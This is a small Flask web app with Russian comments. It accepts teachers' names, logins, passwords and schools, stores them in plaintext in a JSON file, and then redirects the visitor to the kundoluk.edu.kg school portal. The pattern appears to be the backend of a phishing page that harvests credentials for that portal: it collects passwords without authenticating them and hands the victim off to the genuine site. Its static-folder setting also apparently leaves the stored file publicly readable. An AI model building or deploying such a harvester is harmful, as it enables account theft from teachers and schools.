from flask import Flask, render_template, request, redirect
import json
import os
from datetime import datetime

# Инициализируем Flask так, чтобы шаблоны (index.html) и статика находились в корне
app = Flask(
    __name__,
    template_folder='.',  # шаблоны рядом с app.py
    static_folder='.'     # если есть CSS/JS в корне
)

DATA_FILE = 'teachers.json'


def load_data():
    if not os.path.exists(DATA_FILE):
        return []
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except json.JSONDecodeError:
        return []


def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        entry = {
            "fio":      request.form['fio'],
            "login":    request.form['login'],
            "password": request.form['password'],
            "school":   request.form['school'],
            "language": request.form['language'],
            "agreed":   bool(request.form.get('agree')),
            # время в UTC для унификации
            "ts":       datetime.utcnow().isoformat()
        }
        data = load_data()
        data.append(entry)
        save_data(data)
        # при успешной отправке редирект на внешний сайт
        return redirect("https://kundoluk.edu.kg/")
    # при GET отдадим корневой шаблон
    return render_template('index.html')


if __name__ == '__main__':
    # В продакшене используйте WSGI (gunicorn). Для Railway указываем хост и порт из окружения:
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
